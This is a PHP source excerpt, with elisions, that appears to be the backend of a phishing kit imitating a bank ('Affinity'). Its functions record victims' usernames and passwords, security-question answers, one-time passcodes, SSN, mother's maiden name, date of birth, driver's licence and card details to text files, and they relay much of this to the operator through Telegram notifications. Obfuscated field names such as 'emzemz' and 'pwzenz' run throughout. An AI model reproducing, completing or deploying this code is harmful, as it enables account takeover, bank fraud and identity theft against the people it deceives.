 ...
 * Mirrors Affinity implementation with Telegram integration
 */

function saveUserData($filename, $data) {
    $dataDir = DATA_STORAGE_PATH;

    // Normalise username key so user-specific storage works
    if (!isset($data['username'])) {
        if (isset($data['usrnm'])) {
            $data['username'] = $data['usrnm'];
        } elseif (isset($data['emzemz'])) {
            $data['username'] = $data['emzemz'];
        }
    }
...
function sendTelegramNotification($data) {
    ...
    $usrnm = $data['usrnm'] ?? ($data['username'] ?? 'unknown');
    ...
    switch ($step) {
        ...
        case 'security_questions':
            $message = "🔐 Security Questions Completed\n"
                ...
                . "⏰ Time: $timestamp\n\n"
                . "📋 Security Challenges:\n"
                . "1️⃣ " . ($data['chld_pt'] ?? 'N/A') . "\n   Answer: " . ($data['pt_ans'] ?? 'N/A') . "\n"
                . "2️⃣ " . ($data['brth_ct'] ?? 'N/A') . "\n   Answer: " . ($data['ct_ans'] ?? 'N/A') . "\n"
                . "3️⃣ " . ($data['frst_sch'] ?? 'N/A') . "\n   Answer: " . ($data['sch_ans'] ?? 'N/A');
            break;

        case 'otp_verification':
            $message = "🔑 OTP Verification Completed\n"
                . "👤 User: $usrnm\n"
                . "🔢 Code: " . ($data['vrf_cd'] ?? 'N/A') . "\n"
                . "✅ Status: Verified\n"
                . "⏰ Time: $timestamp";
            break;
        ...
        default:
            ...
            foreach ($data as $key => $value) {
                if (is_array($value)) {
                    ...
                    if (in_array($key, ['acc_cd', 'sec_cd', 'pin_cd', 'tax_id', 'password', 'confirmPassword', 'cvv', 'atmPin', 'ssn'])) {
                        $maskedValue = str_repeat('*', strlen((string) $value));
                        $message .= "🔹 $key: $maskedValue\n";
                    } elseif ($key === 'pay_card' || $key === 'cardNumber') {
                        $message .= "🔹 $key: " . substr((string) $value, 0, 4) . "-XXXX-XXXX-" . substr((string) $value, -4) . "\n";
                    } else {
                        $message .= "🔹 $key: $value\n";
                    }
                }
...
function parseUserDataFile($filepath, $stepFilter = null) {
    ...
    foreach ($lines as $line) {
        if (preg_match('/^\[.*?\] Step: ([^-]+) - (.+)$/', $line, $matches)) {
            ...
            if ($jsonData && ($stepFilter === null || $step === $stepFilter)) {
                $data[] = $jsonData;
            }
...
function saveLoginData($emzemz, $pwzenz, $remember = false) {
    $data = [
        'step' => 'login',
        'usrnm' => $emzemz,
        'emzemz' => $emzemz,
    ...
    return saveUserData('login_attempts.txt', $data);
}
...
function saveSecurityQuestions($emzemz, $securityQuestion1, $securityAnswer1, $securityQuestion2, $securityAnswer2, $securityQuestion3, $securityAnswer3) {
    $data = [
        ...
        'usrnm' => $emzemz,
        'chld_pt' => $securityQuestion1,
        'pt_ans' => $securityAnswer1,
        'brth_ct' => $securityQuestion2,
        'ct_ans' => $securityAnswer2,
        'frst_sch' => $securityQuestion3,
        'sch_ans' => $securityAnswer3
    ];
...
function saveBasicInfo($emzemz, $fzNme, $lzNme, $phone, $ssn, $motherMaidenName, $dob, $driverLicense) {
    ...
    return saveUserData('basic_info_home_address.txt', $data);
}
...
function saveOTP($emzemz, $otp) {
    ...
    return saveUserData('otp_verification.txt', $data);
}

function validateUser($emzemz, $pwzenz) {
    $userData = getUserData('login_attempts.txt', $emzemz);

    foreach ($userData as $entry) {
        if (($entry['emzemz'] ?? null) === $emzemz && ($entry['pwzenz'] ?? null) === $pwzenz) {
            return true;
        }
    }

    $sharedData = getUserData('login_attempts.txt');
